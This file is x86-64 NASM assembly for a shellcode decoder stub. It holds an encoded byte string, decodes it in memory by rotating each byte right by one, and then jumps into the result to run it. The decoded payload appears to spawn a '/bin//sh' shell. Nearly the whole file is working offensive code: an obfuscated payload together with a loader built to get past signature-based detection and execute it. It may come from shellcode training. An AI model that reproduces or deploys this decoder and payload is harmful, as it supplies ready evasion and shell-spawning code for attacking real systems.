; Filename: rotateRightDecoder.nasm
; Author:   boku aka Bobby Cooke
global _start
section .text
_start:
  jmp short call_decoder ; 1. jump to shellcode string
decoder:
  pop rsi                ; 3. RSI=&String 
decode:
  ror byte [rsi], 1      ; 4. decode byte with bitwise rotate right
  cmp byte [rsi], 0x55   ; 5. Last byte? ror 0xaa, 1 = 0x55
  je Shellcode           ;    - Yes? jump to payload and execute
  inc rsi                ; 6. No? Move forward 1 byte
  jmp short decode       ; 7. Lets decode the next byte
call_decoder:
  call decoder           ; 2. [RSP]=&String
  Shellcode: db 0x90,0x62,0xed,0x90,0xef,0xcd,0x90,0x62,0xff,0xae,\
                0x90,0x07,0x85,0xd0,0xa4,0x90,0x75,0x5e,0xc4,0xd2,\
                0xdc,0x5e,0xc4,0xc2,0xe6,0xa4,0x90,0x62,0xa5,0x90,\
                0x13,0xcf,0x61,0x76,0x1e,0x0a,0xaa

